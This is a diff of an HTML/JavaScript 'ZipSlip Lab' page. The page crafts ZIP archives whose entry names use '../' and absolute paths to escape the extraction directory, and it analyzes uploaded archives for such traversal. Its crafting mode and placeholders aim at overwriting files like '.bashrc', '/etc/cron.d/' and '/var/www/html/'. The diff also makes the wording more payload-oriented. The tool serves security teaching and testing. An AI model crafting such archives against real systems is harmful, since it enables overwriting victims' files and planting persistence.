@@ -1,150 +1,220 @@
 <!doctype html>
 <html lang="en">
 <head>
-<!-- ============================================================
-     index.html — ZipSlip Lab by Aryan Giri
-     Archive path-traversal (Zip Slip) demonstration tool.
-     Structure mirrors index.html / style.css / script.js so you
-     can split the sections apart when deploying to GitHub Pages.
-     ============================================================ -->
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>ZipSlip Lab — Archive Path Traversal Demonstrator</title>
 <style>
 /* ===== style.css ============================================ */
 :root {
-  --bg: #0d1117;
-  --panel: #161b22;
-  --panel-2: #1c2330;
-  --border: #2d3748;
-  --text: #e6edf3;
-  --muted: #8b949e;
-  --accent: #3b82f6;
-  --danger: #f85149;
-  --danger-bg: #2d1216;
-  --safe: #3fb950;
-  --safe-bg: #0f2417;
-  --warn: #d29922;
-  --warn-bg: #2b2110;
-  --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  --bg: #0a0a0a;
+  --panel: #121212;
+  --panel-2: #18181b;
+  --border: #262626;
+  --border-hover: #3f3f46;
+  --text: #fafafa;
+  --muted: #71717a;
+  --accent: #ffffff;
+  --danger: #ef4444;
+  --danger-bg: rgba(239, 68, 68, 0.08);
+  --safe: #22c55e;
+  --safe-bg: rgba(34, 197, 94, 0.08);
+  --warn: #eab308;
+  --warn-bg: rgba(234, 179, 8, 0.08);
+  --mono: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+  --sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
 }
+
 body.theme-light {
-  --bg: #f6f8fa;
-  --panel: #ffffff;
-  --panel-2: #f0f3f6;
-  --border: #d0d7de;
-  --text: #1f2328;
-  --muted: #57606a;
-  --danger-bg: #ffebe9;
-  --safe-bg: #e6ffec;
-  --warn-bg: #fff8c5;
+  --bg: #ffffff;
+  --panel: #f8fafc;
+  --panel-2: #f1f5f9;
+  --border: #e2e8f0;
+  --border-hover: #cbd5e1;
+  --text: #0f172a;
+  --muted: #64748b;
+  --accent: #0f172a;
+  --danger-bg: #fef2f2;
+  --safe-bg: #f0fdf4;
+  --warn-bg: #fefce8;
 }
+
 body.theme-eyesaver {
-  --bg: #f5e9c8;
-  --panel: #faf0d3;
-  --panel-2: #efe0b6;
-  --border: #d8c48f;
-  --text: #3a3222;
-  --muted: #6e6248;
-  --danger-bg: #f3d9c0;
-  --danger: #b3391b;
-  --safe-bg: #dcebb8;
-  --safe: #4a6b1f;
-  --warn-bg: #f3e3ae;
-  --warn: #8a6d1a;
+  --bg: #f4f1ea;
+  --panel: #fdfbf7;
+  --panel-2: #f2eee5;
+  --border: #e0dcd3;
+  --border-hover: #cfc9bd;
+  --text: #292524;
+  --muted: #78716c;
+  --accent: #292524;
+  --danger-bg: #fff1f2;
+  --safe-bg: #f0fdf4;
+  --warn-bg: #fffbeb;
 }
+
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body {
   background: var(--bg);
   color: var(--text);
-  font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
-  font-size: 15px;
-  line-height: 1.55;
-  padding: 16px;
+  font-family: var(--sans);
+  font-size: 14px;
+  line-height: 1.6;
+  padding: 24px;
+  -webkit-font-smoothing: antialiased;
 }
-.wrap { max-width: 900px; margin: 0 auto; }
-header { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; justify-content: space-between; margin-bottom: 14px; }
-h1 { font-size: 1.35rem; letter-spacing: -0.01em; }
-h1 span { color: var(--accent); }
-.subtitle { color: var(--muted); font-size: 0.85rem; }
-.theme-bar { display: flex; gap: 6px; }
+
+.wrap { max-width: 860px; margin: 0 auto; }
+
+header { 
+  display: flex; 
+  flex-wrap: wrap; 
+  gap: 16px; 
+  align-items: flex-end; 
+  justify-content: space-between; 
+  margin-bottom: 24px; 
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 16px;
+}
+h1 { font-size: 1.1rem; font-weight: 600; letter-spacing: -0.02em; font-family: var(--mono); }
+.subtitle { color: var(--muted); font-size: 0.8rem; margin-top: 2px; }
+
+.theme-bar { display: flex; gap: 4px; background: var(--panel-2); padding: 4px; border-radius: 6px; border: 1px solid var(--border); }
 .theme-bar button {
-  background: var(--panel-2); color: var(--text); border: 1px solid var(--border);
-  border-radius: 6px; padding: 5px 10px; font-size: 0.78rem; cursor: pointer;
+  background: transparent; color: var(--muted); border: none;
+  border-radius: 4px; padding: 4px 10px; font-size: 0.75rem; cursor: pointer; font-family: var(--sans); font-weight: 500;
+  transition: all 0.15s;
 }
-.theme-bar button.active { border-color: var(--accent); color: var(--accent); }
+.theme-bar button.active { background: var(--bg); color: var(--text); box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+
 .card {
-  background: var(--panel); border: 1px solid var(--border); border-radius: 10px;
-  padding: 16px; margin-bottom: 14px;
+  background: var(--panel); 
+  border: 1px solid var(--border); 
+  border-radius: 8px;
+  padding: 20px; 
+  margin-bottom: 16px;
 }
-.card h2 { font-size: 1rem; margin-bottom: 4px; }
-.card .hint { color: var(--muted); font-size: 0.82rem; margin-bottom: 12px; }
+.card h2 { font-size: 0.85rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; color: var(--muted); margin-bottom: 4px; }
+.card .hint { color: var(--muted); font-size: 0.8rem; margin-bottom: 16px; }
+.card .hint code { background: var(--panel-2); padding: 1px 5px; border-radius: 3px; font-family: var(--mono); font-size: 0.75rem; border: 1px solid var(--border); }
+
 .notice {
-  border: 1px solid var(--warn); background: var(--warn-bg); color: var(--text);
-  border-radius: 8px; padding: 8px 12px; font-size: 0.8rem; margin-bottom: 14px;
+  border: 1px solid var(--border); 
+  background: var(--panel-2); 
+  color: var(--text);
+  border-radius: 6px; 
+  padding: 12px 16px; 
+  font-size: 0.8rem; 
+  margin-bottom: 16px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
 }
-.modes { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.notice::before {
+  content: "!";
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 20px;
+  height: 20px;
+  background: var(--warn);
+  color: #000;
+  font-weight: 800;
+  font-size: 0.75rem;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+
+.modes { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
 .modes button {
-  background: var(--panel); border: 2px solid var(--border); border-radius: 10px;
-  color: var(--text); padding: 18px 14px; cursor: pointer; text-align: left; font-size: 0.95rem;
+  background: var(--panel-2); border: 1px solid var(--border); border-radius: 6px;
+  color: var(--text); padding: 16px; cursor: pointer; text-align: left; font-size: 0.85rem;
+  transition: all 0.15s;
 }
-.modes button strong { display: block; margin-bottom: 4px; }
-.modes button small { color: var(--muted); }
-.modes button.active { border-color: var(--accent); }
-label { display: block; font-size: 0.8rem; color: var(--muted); margin: 10px 0 4px; }
+.modes button:hover { border-color: var(--border-hover); }
+.modes button strong { display: block; margin-bottom: 4px; font-weight: 600; }
+.modes button small { color: var(--muted); font-size: 0.78rem; }
+.modes button.active { border-color: var(--text); background: var(--bg); }
+
+label { display: block; font-size: 0.75rem; color: var(--muted); margin: 12px 0 6px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.03em; }
 input[type="text"], textarea, select {
-  width: 100%; background: var(--panel-2); border: 1px solid var(--border);
-  color: var(--text); border-radius: 8px; padding: 9px 11px; font-size: 0.9rem;
-  font-family: var(--mono);
+  width: 100%; background: var(--bg); border: 1px solid var(--border);
+  color: var(--text); border-radius: 4px; padding: 8px 12px; font-size: 0.85rem;
+  font-family: var(--mono); transition: border-color 0.15s;
 }
-textarea { min-height: 84px; resize: vertical; }
-input:focus, textarea:focus { outline: 2px solid var(--accent); outline-offset: -1px; }
+textarea { min-height: 80px; resize: vertical; }
+input:focus, textarea:focus { outline: none; border-color: var(--text); }
+
 .row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
 .row > * { flex: 1; min-width: 200px; }
+
 .btn {
-  background: var(--accent); color: #fff; border: 1px solid transparent;
-  border-radius: 8px; padding: 9px 16px; font-size: 0.85rem; cursor: pointer; font-weight: 600;
+  background: var(--text); color: var(--bg); border: 1px solid var(--text);
+  border-radius: 4px; padding: 8px 16px; font-size: 0.8rem; cursor: pointer; font-weight: 500;
+  transition: opacity 0.15s; font-family: var(--sans);
 }
-.btn.secondary { background: var(--panel-2); color: var(--text); border-color: var(--border); font-weight: 400; }
-.btn.small { padding: 5px 10px; font-size: 0.75rem; border-radius: 6px; }
-.btn.danger { background: var(--danger); }
-.btn:disabled { opacity: 0.5; cursor: not-allowed; }
-.src-toggle { display: inline-flex; gap: 0; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
-.src-toggle button { background: var(--panel-2); color: var(--muted); border: none; padding: 7px 14px; font-size: 0.8rem; cursor: pointer; }
-.src-toggle button.active { background: var(--accent); color: #fff; }
-.entry-list, .sim-list { display: flex; flex-direction: column; gap: 8px; margin-top: 12px; }
+.btn:hover { opacity: 0.9; }
+.btn.secondary { background: transparent; color: var(--text); border-color: var(--border); }
+.btn.secondary:hover { border-color: var(--border-hover); background: var(--panel-2); }
+.btn.small { padding: 4px 10px; font-size: 0.75rem; border-radius: 3px; }
+.btn.danger { background: var(--danger); color: #fff; border-color: var(--danger); }
+.btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+.src-toggle { display: inline-flex; gap: 0; border: 1px solid var(--border); border-radius: 4px; overflow: hidden; margin-top: 6px; }
+.src-toggle button { background: var(--panel-2); color: var(--muted); border: none; padding: 6px 14px; font-size: 0.78rem; cursor: pointer; border-right: 1px solid var(--border); font-family: var(--sans); }
+.src-toggle button:last-child { border-right: none; }
+.src-toggle button.active { background: var(--bg); color: var(--text); font-weight: 600; }
+
+.entry-list, .sim-list { display: flex; flex-direction: column; gap: 8px; margin-top: 16px; }
 .entry {
-  background: var(--panel-2); border: 1px solid var(--border); border-radius: 8px;
-  padding: 10px 12px; display: flex; flex-wrap: wrap; gap: 8px; align-items: center; justify-content: space-between;
+  background: var(--panel-2); border: 1px solid var(--border); border-radius: 4px;
+  padding: 12px 14px; display: flex; flex-wrap: wrap; gap: 12px; align-items: center; justify-content: space-between;
 }
-.entry .path { font-family: var(--mono); font-size: 0.85rem; word-break: break-all; }
-.entry .meta { color: var(--muted); font-size: 0.75rem; }
+.entry .path { font-family: var(--mono); font-size: 0.82rem; word-break: break-all; color: var(--text); }
+.entry .meta { color: var(--muted); font-size: 0.72rem; margin-top: 2px; }
 .entry .right { display: flex; gap: 6px; align-items: center; }
-.badge { font-size: 0.7rem; font-weight: 700; border-radius: 5px; padding: 3px 8px; letter-spacing: 0.02em; }
+
+.badge { font-size: 0.68rem; font-weight: 600; border-radius: 3px; padding: 3px 8px; letter-spacing: 0.04em; text-transform: uppercase; font-family: var(--mono); }
 .badge.escape { background: var(--danger-bg); color: var(--danger); border: 1px solid var(--danger); }
 .badge.safe { background: var(--safe-bg); color: var(--safe); border: 1px solid var(--safe); }
 .badge.abs { background: var(--warn-bg); color: var(--warn); border: 1px solid var(--warn); }
-.sim-item { background: var(--panel-2); border: 1px solid var(--border); border-left-width: 4px; border-radius: 8px; padding: 10px 12px; }
+
+.sim-item { background: var(--panel-2); border: 1px solid var(--border); border-left: 3px solid var(--border); border-radius: 4px; padding: 12px 14px; margin-top: 12px; }
 .sim-item.escape { border-left-color: var(--danger); }
 .sim-item.safe { border-left-color: var(--safe); }
-.sim-item .from { color: var(--muted); font-family: var(--mono); font-size: 0.8rem; word-break: break-all; }
-.sim-item .to { font-family: var(--mono); font-size: 0.88rem; margin-top: 3px; word-break: break-all; }
-.sim-item .why { color: var(--danger); font-size: 0.78rem; margin-top: 3px; }
+.sim-item .from { color: var(--muted); font-family: var(--mono); font-size: 0.78rem; word-break: break-all; }
+.sim-item .to { font-family: var(--mono); font-size: 0.85rem; margin-top: 4px; word-break: break-all; color: var(--text); }
+.sim-item .why { color: var(--danger); font-size: 0.75rem; margin-top: 4px; font-weight: 500; }
 .sim-item .why.ok { color: var(--safe); }
-.sim-item .safe-line { color: var(--muted); font-size: 0.78rem; margin-top: 4px; font-family: var(--mono); word-break: break-all; }
-.summary { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 12px; }
-.summary .box { flex: 1; min-width: 140px; text-align: center; border: 1px solid var(--border); border-radius: 8px; padding: 10px; background: var(--panel-2); }
-.summary .box b { display: block; font-size: 1.3rem; }
-.file-input-label { display: inline-block; background: var(--panel-2); border: 1px dashed var(--border); color: var(--muted); border-radius: 8px; padding: 12px; font-size: 0.8rem; cursor: pointer; width: 100%; text-align: center; }
-.file-input-label:hover { border-color: var(--accent); color: var(--text); }
-footer { color: var(--muted); font-size: 0.78rem; text-align: center; margin-top: 18px; line-height: 1.7; }
-footer .credit { font-weight: 800; font-size: 1.08rem; color: var(--accent); letter-spacing: 0.02em; margin-bottom: 4px; }
-details { margin-top: 10px; }
-details summary { cursor: pointer; color: var(--accent); font-size: 0.82rem; }
-details p { color: var(--muted); font-size: 0.8rem; margin-top: 6px; }
-.toast { position: fixed; bottom: 18px; left: 50%; transform: translateX(-50%); background: var(--panel-2); color: var(--text); border: 1px solid var(--accent); border-radius: 8px; padding: 8px 16px; font-size: 0.8rem; opacity: 0; transition: opacity 0.2s; pointer-events: none; }
-.toast.show { opacity: 1; }
-@media (max-width: 640px) { .modes { grid-template-columns: 1fr; } body { padding: 10px; } }
+
+.summary { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 16px; }
+.summary .box { flex: 1; min-width: 120px; text-align: center; border: 1px solid var(--border); border-radius: 4px; padding: 12px; background: var(--panel-2); }
+.summary .box b { display: block; font-size: 1.4rem; font-family: var(--mono); font-weight: 600; }
+
+.file-input-label { 
+  display: block; background: var(--panel-2); border: 1px dashed var(--border-hover); color: var(--muted); 
+  border-radius: 4px; padding: 16px; font-size: 0.8rem; cursor: pointer; width: 100%; text-align: center;
+  transition: all 0.15s; font-family: var(--mono);
+}
+.file-input-label:hover { border-color: var(--text); color: var(--text); }
+
+footer { color: var(--muted); font-size: 0.75rem; text-align: center; margin-top: 24px; line-height: 1.6; border-top: 1px solid var(--border); padding-top: 16px; }
+footer .credit { font-weight: 600; font-size: 0.85rem; color: var(--text); letter-spacing: -0.01em; margin-bottom: 4px; }
+
+.toast { 
+  position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(20px); 
+  background: var(--text); color: var(--bg); border: 1px solid var(--border); 
+  border-radius: 4px; padding: 8px 16px; font-size: 0.78rem; font-weight: 500; 
+  opacity: 0; transition: all 0.2s ease; pointer-events: none; 
+}
+.toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+@media (max-width: 640px) { 
+  .modes { grid-template-columns: 1fr; } 
+  body { padding: 16px; } 
+  .entry { flex-direction: column; align-items: flex-start; }
+  .entry .right { margin-top: 8px; width: 100%; justify-content: flex-end; }
+}
 </style>
 </head>
 <body>
@@ -152,72 +222,69 @@ details p { color: var(--muted); font-size: 0.8rem; margin-top: 6px; }
 
   <header>
     <div>
-      <h1>ZipSlip <span>Lab</span></h1>
-      <div class="subtitle">Archive path-traversal (Zip Slip) demonstrator — craft & analyze</div>
+      <h1>ZipSlip_Lab</h1>
+      <div class="subtitle">Archive path-traversal demonstration tool</div>
     </div>
     <div class="theme-bar">
       <button data-theme="dark">Dark</button>
       <button data-theme="light">Light</button>
-      <button data-theme="eyesaver">Eye-saver</button>
+      <button data-theme="eyesaver">Sepia</button>
     </div>
   </header>
 
   <div class="notice">
-    ⚠ Educational tool — demonstrates how naive archive extraction writes files outside the
-    target directory. Use only on systems you own or are explicitly authorized to test.
+    Educational environment. Demonstrates naive archive extraction path traversal. Use only on authorized systems.
   </div>
 
-  <!-- Step 1: mode picker -->
   <div class="card">
-    <h2>1 · Choose a mode</h2>
-    <div class="hint">Craft a malicious demo archive, or analyze an existing ZIP for traversal paths.</div>
+    <h2>01 / Operation Mode</h2>
+    <div class="hint">Select whether to construct a payload archive or inspect an existing file.</div>
     <div class="modes">
-      <button id="mode-craft" class="active"><strong>＋ Create ZIP</strong><small>Build a Zip-Slip archive entry by entry (text or uploaded files)</small></button>
-      <button id="mode-analyze"><strong>🔍 Upload ZIP</strong><small>Inspect an existing archive and flag dangerous entry paths</small></button>
+      <button id="mode-craft" class="active"><strong>Create Archive</strong><small>Construct a Zip-Slip payload entry by entry</small></button>
+      <button id="mode-analyze"><strong>Analyze Archive</strong><small>Parse an existing ZIP and flag traversal vectors</small></button>
     </div>
   </div>
 
-  <!-- Step 2: craft panel -->
   <div class="card" id="craft-panel">
-    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px">
-      <h2>2 · Archive files</h2>
+    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; margin-bottom: 8px;">
+      <h2>02 / Payload Entries</h2>
       <div style="display:flex; gap:8px; flex-wrap:wrap">
-        <button class="btn" id="toggle-form">＋ Add file</button>
-        <button class="btn secondary" id="load-demo">Load demo</button>
+        <button class="btn" id="toggle-form">Add Entry</button>
+        <button class="btn secondary" id="load-demo">Load Demo</button>
         <button class="btn secondary" id="clear-entries">Clear</button>
       </div>
     </div>
-    <div class="hint">For each file: enter the <b>file name</b>, its <b>content</b> (text or upload), then the <b>overwrite path</b> — the directory where it should be created or overwrite an existing file, e.g. <span style="font-family:var(--mono)">/home/user/</span>. Leave the path empty to keep the file safely inside the extraction directory. Absolute overwrite paths get a standard <span style="font-family:var(--mono)">../../../../../../../../</span> prefix added automatically.</div>
+    <div class="hint">Define the internal archive filename and the target overwrite path. Paths are used exactly as entered. Manually include <code>../</code> segments if you need relative path traversal from the extraction root.</div>
 
-    <div id="entry-form" style="display:none">
-      <label>1 · File name (added to the archive)</label>
-      <input type="text" id="entry-name" placeholder=".bashrc  ·  test.txt  ·  evil" spellcheck="false" />
+    <div id="entry-form" style="display:none; border-top: 1px solid var(--border); padding-top: 16px; margin-top: 8px;">
+      <label>Internal Filename</label>
+      <input type="text" id="entry-name" placeholder=".bashrc, update.sh, config.yml" spellcheck="false" />
 
-      <label>2 · File source</label>
+      <label>Content Source</label>
       <div class="src-toggle">
-        <button id="src-text" class="active">Text content</button>
-        <button id="src-file">Upload file</button>
+        <button id="src-text" class="active">Raw Text</button>
+        <button id="src-file">Binary Upload</button>
       </div>
 
       <div id="text-src">
-        <label>Text file content</label>
-        <textarea id="entry-content" placeholder="# demo payload — lands wherever the overwrite path points"></textarea>
+        <label>File Contents</label>
+        <textarea id="entry-content" placeholder="# payload contents..."></textarea>
       </div>
       <div id="file-src" style="display:none">
-        <label>File to embed (stored uncompressed)</label>
-        <label class="file-input-label" for="entry-file">📂 Choose a file…<input type="file" id="entry-file" hidden /></label>
+        <label>Binary Payload</label>
+        <label class="file-input-label" for="entry-file">Select file to embed...<input type="file" id="entry-file" hidden /></label>
       </div>
 
-      <label>3 · Overwrite path — directory this file will be created in / will overwrite (when extraction is naive)</label>
-      <input type="text" id="entry-dest" placeholder="/home/user/   ·   /etc/cron.d/   ·   (blank = inside extraction dir)" spellcheck="false" />
+      <label>Overwrite Path (Destination directory)</label>
+      <input type="text" id="entry-dest" placeholder="../../../../etc/cron.d/ or /var/www/html/" spellcheck="false" />
 
-      <div class="sim-item" id="entry-preview" style="margin-top:10px">
-        <div class="to" id="preview-entry">→ archive entry: …</div>
-        <div class="from" id="preview-lands">lands at: …</div>
+      <div class="sim-item" id="entry-preview" style="margin-top:12px">
+        <div class="to" id="preview-entry">Archive entry: …</div>
+        <div class="from" id="preview-lands">Resolves to: …</div>
       </div>
 
-      <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap">
-        <button class="btn" id="add-entry">Add file to archive</button>
+      <div style="margin-top:16px; display:flex; gap:8px; flex-wrap:wrap">
+        <button class="btn" id="add-entry">Commit Entry</button>
         <button class="btn secondary" id="cancel-entry">Cancel</button>
       </div>
     </div>
@@ -225,34 +292,32 @@ details p { color: var(--muted); font-size: 0.8rem; margin-top: 6px; }
     <div class="entry-list" id="entry-list"></div>
   </div>
 
-  <!-- Generate -->
   <div class="card" id="gen-panel">
-    <h2>3 · Generate archive</h2>
-    <div class="hint">Name the ZIP file, then generate.</div>
-    <label>ZIP file name (.zip added automatically)</label>
-    <input type="text" id="zip-name" value="zipslip-demo" spellcheck="false" />
-    <div class="row" style="margin-top:12px">
-      <button class="btn danger" id="generate">Generate & download ZIP</button>
-      <button class="btn secondary" id="copy-list">Copy entry list</button>
+    <h2>03 / Compilation</h2>
+    <div class="hint">Finalize the archive structure and export the payload.</div>
+    <label>Output Filename</label>
+    <input type="text" id="zip-name" value="zipslip_payload" spellcheck="false" />
+    <div class="row" style="margin-top:16px">
+      <button class="btn danger" id="generate">Compile & Download</button>
+      <button class="btn secondary" id="copy-list">Copy Paths</button>
     </div>
   </div>
 
-  <!-- Analyze panel -->
   <div class="card" id="analyze-panel" style="display:none">
-    <h2>2 · Analyze an existing archive</h2>
-    <div class="hint">Upload a ZIP — every entry is parsed and checked for <span style="font-family:var(--mono)">..</span> traversal and absolute-path tricks.</div>
-    <label class="file-input-label" for="upload-zip">📂 Choose a .zip file…<input type="file" id="upload-zip" accept=".zip,application/zip" hidden /></label>
-    <div class="entry-list" id="analyze-list" style="margin-top:14px"></div>
+    <h2>02 / Static Analysis</h2>
+    <div class="hint">Upload a target archive to map internal entry names against standard extraction logic.</div>
+    <label class="file-input-label" for="upload-zip">Select .zip archive for analysis...<input type="file" id="upload-zip" accept=".zip,application/zip" hidden /></label>
+    <div class="entry-list" id="analyze-list" style="margin-top:16px"></div>
     <div class="summary" id="analyze-summary" style="display:none">
-      <div class="box"><b id="ana-total">0</b>entries</div>
-      <div class="box"><b id="ana-safe" style="color:var(--safe)">0</b>look safe</div>
-      <div class="box"><b id="ana-danger" style="color:var(--danger)">0</b>dangerous</div>
+      <div class="box"><b id="ana-total">0</b>Total Entries</div>
+      <div class="box"><b id="ana-safe" style="color:var(--safe)">0</b>Contained</div>
+      <div class="box"><b id="ana-danger" style="color:var(--danger)">0</b>Traversal</div>
     </div>
   </div>
 
   <footer>
-    <div class="credit">Made By Aryan Giri | giriaryan694-a11y</div>
-    <div>Zip Slip — archive extraction path traversal, publicly documented by Snyk (2018). Demo archive: entries stored uncompressed, no code executed.</div>
+    <div class="credit">Aryan Giri | ZipSlip Lab</div>
+    <div>Archive extraction path traversal research tool.</div>
   </footer>
 </div>
 
@@ -261,7 +326,7 @@ details p { color: var(--muted); font-size: 0.8rem; margin-top: 6px; }
 <script>
 /* ===== script.js ============================================ */
 
-/* ---------- theme (cookie-stored when possible) ---------- */
+/* ---------- theme management ---------- */
 const THEMES = ["dark", "light", "eyesaver"];
 function applyTheme(t) {
   if (!THEMES.includes(t)) t = "dark";
@@ -281,14 +346,14 @@ document.querySelectorAll(".theme-bar button").forEach(b =>
   applyTheme(t);
 })();
 
-/* ---------- tiny helpers ---------- */
+/* ---------- helpers ---------- */
 const $ = id => document.getElementById(id);
 function toast(msg) {
   const el = $("toast");
   el.textContent = msg;
   el.classList.add("show");
   clearTimeout(el._t);
-  el._t = setTimeout(() => el.classList.remove("show"), 2200);
+  el._t = setTimeout(() => el.classList.remove("show"), 2500);
 }
 function copyText(text) {
   const done = () => toast("Copied to clipboard");
@@ -299,18 +364,14 @@ function copyText(text) {
 function fallbackCopy(text, done) {
   try {
     const ta = document.createElement("textarea");
-    ta.value = text;
-    ta.style.position = "fixed"; ta.style.opacity = "0";
-    document.body.appendChild(ta);
-    ta.select();
-    document.execCommand("copy");
-    document.body.removeChild(ta);
-    done();
-  } catch (e) { toast("Copy blocked — select the text manually"); }
+    ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0";
+    document.body.appendChild(ta); ta.select();
+    document.execCommand("copy"); document.body.removeChild(ta); done();
+  } catch (e) { toast("Clipboard access denied"); }
 }
 const enc = new TextEncoder();
 
-/* ---------- CRC-32 (ZIP standard) ---------- */
+/* ---------- CRC-32 ---------- */
 const CRC_TABLE = (() => {
   const t = new Uint32Array(256);
   for (let n = 0; n < 256; n++) {
@@ -326,7 +387,7 @@ function crc32(bytes) {
   return (crc ^ 0xffffffff) >>> 0;
 }
 
-/* ---------- minimal ZIP writer (method 0: store) ---------- */
+/* ---------- ZIP writer (store method) ---------- */
 function buildZip(entries) {
   const chunks = [], central = [];
   let offset = 0;
@@ -341,10 +402,10 @@ function buildZip(entries) {
 
     const lh = new Uint8Array(30 + nameBytes.length);
     const v = new DataView(lh.buffer);
-    v.setUint32(0, 0x04034b50, true);   // local file header signature
-    v.setUint16(4, 20, true);            // version needed
-    v.setUint16(6, 0x0800, true);       // flags: UTF-8 filename
-    v.setUint16(8, 0, true);            // method: stored
+    v.setUint32(0, 0x04034b50, true);   
+    v.setUint16(4, 20, true);            
+    v.setUint16(6, 0x0800, true);       
+    v.setUint16(8, 0, true);            
     v.setUint16(10, dosTime, true);
     v.setUint16(12, dosDate, true);
     v.setUint32(14, crc, true);
@@ -357,7 +418,7 @@ function buildZip(entries) {
 
     const cd = new Uint8Array(46 + nameBytes.length);
     const w = new DataView(cd.buffer);
-    w.setUint32(0, 0x02014b50, true);   // central directory signature
+    w.setUint32(0, 0x02014b50, true);   
     w.setUint16(4, 20, true);
     w.setUint16(6, 20, true);
     w.setUint16(8, 0x0800, true);
@@ -368,7 +429,7 @@ function buildZip(entries) {
     w.setUint32(20, data.length, true);
     w.setUint32(24, data.length, true);
     w.setUint16(28, nameBytes.length, true);
-    w.setUint32(42, offset, true);      // local header offset
+    w.setUint32(42, offset, true);      
     cd.set(nameBytes, 46);
     central.push(cd);
 
@@ -387,7 +448,7 @@ function buildZip(entries) {
   return new Blob([...chunks, ...central, eocd], { type: "application/zip" });
 }
 
-/* ---------- minimal ZIP central-directory reader ---------- */
+/* ---------- ZIP reader ---------- */
 function parseZip(buffer) {
   const dv = new DataView(buffer);
   const len = buffer.byteLength;
@@ -395,7 +456,7 @@ function parseZip(buffer) {
   for (let i = len - 22; i >= Math.max(0, len - 66000); i--) {
     if (dv.getUint32(i, true) === 0x06054b50) { eocd = i; break; }
   }
-  if (eocd === -1) throw new Error("Not a valid ZIP (no end-of-central-directory record)");
+  if (eocd === -1) throw new Error("Invalid ZIP structure");
   const count = dv.getUint16(eocd + 10, true);
   let ptr = dv.getUint32(eocd + 16, true);
   const entries = [];
@@ -417,16 +478,13 @@ function parseZip(buffer) {
   return entries;
 }
 
-/* ---------- path-traversal analysis ---------- */
+/* ---------- path analysis ---------- */
 function analyzePath(targetDir, name) {
   const norm = p => p.replace(/\\/g, "/");
   const base = norm(targetDir).replace(/^\/+|\/+$/g, "").split("/").filter(Boolean);
   const isAbs = /^\/|^[a-zA-Z]:/.test(norm(name));
   const parts = norm(name).split("/").filter(p => p !== "" && p !== ".");
 
-  // Simulate a naive extractor: os.path.join(target, entryName)
-  // - absolute entryName replaces the target entirely (posix join semantics)
-  // - ".." pops freely, climbing above the target root
   let stack = isAbs ? [] : [...base];
   let dotCount = 0;
   for (const p of parts) {
@@ -437,34 +495,32 @@ function analyzePath(targetDir, name) {
   }
   const t = norm(targetDir).replace(/\/+$/, "");
   const naive = (isAbs || t.startsWith("/") ? "/" : "") + stack.join("/");
-  // how many directory levels above the extraction directory the file lands
+  
   let common = 0;
   while (common < base.length && common < stack.length && base[common] === stack[common]) common++;
   const escapeDepth = isAbs ? 0 : Math.max(0, base.length - common);
   const contained = !isAbs && (naive === t || naive.startsWith(t + "/"));
   const escapes = isAbs || !contained;
 
-  // Safe extractor: reject / quarantine
   let safeAction;
-  if (isAbs) safeAction = "REJECT — entry name is absolute: " + norm(name);
-  else if (escapeDepth > 0) safeAction = "QUARANTINE — '" + norm(name) + "' climbs " + escapeDepth + " level(s) above target; flattened to: /" + parts.filter(p => p !== "..").join("/");
-  else safeAction = "OK — contained inside target";
+  if (isAbs) safeAction = "REJECT — absolute path";
+  else if (escapeDepth > 0) safeAction = "QUARANTINE — climbs " + escapeDepth + " level(s) above root";
+  else safeAction = "OK — contained";
 
   const reasons = [];
-  if (isAbs) reasons.push("absolute path — extraction directory is ignored entirely");
-  if (escapeDepth > 0) reasons.push(escapeDepth + " unguarded '..' segment(s) climb above the target root");
-  if (dotCount > 0 && escapeDepth === 0 && !isAbs) reasons.push("contains '..' but stays inside the target (harmless here)");
-  if (name.endsWith("/")) reasons.push("directory entry");
+  if (isAbs) reasons.push("absolute path ignores extraction root");
+  if (escapeDepth > 0) reasons.push(escapeDepth + " unguarded '..' segments escape root");
+  if (name.endsWith("/")) reasons.push("directory marker");
 
   return { naive, escapes, escapeDepth, isAbs, reasons, safeAction, dotCount };
 }
 
-/* ---------- app state ---------- */
+/* ---------- state ---------- */
 let mode = "craft";
-let entries = [];               // {name, data, srcLabel}
-let uploadSrc = null;          // {name, bytes} for file-source entries
+let entries = [];               
+let uploadSrc = null;          
 
-/* ---------- mode switching ---------- */
+/* ---------- UI bindings ---------- */
 $("mode-craft").addEventListener("click", () => setMode("craft"));
 $("mode-analyze").addEventListener("click", () => setMode("analyze"));
 function setMode(m) {
@@ -476,7 +532,6 @@ function setMode(m) {
   $("analyze-panel").style.display = m === "analyze" ? "" : "none";
 }
 
-/* ---------- source toggle ---------- */
 $("src-text").addEventListener("click", () => setSrc("text"));
 $("src-file").addEventListener("click", () => setSrc("file"));
 function setSrc(s) {
@@ -489,35 +544,31 @@ $("entry-file").addEventListener("change", async e => {
   const f = e.target.files[0];
   if (!f) return;
   uploadSrc = { name: f.name, bytes: new Uint8Array(await f.arrayBuffer()) };
-  toast("Loaded " + f.name + " (" + uploadSrc.bytes.length + " bytes)");
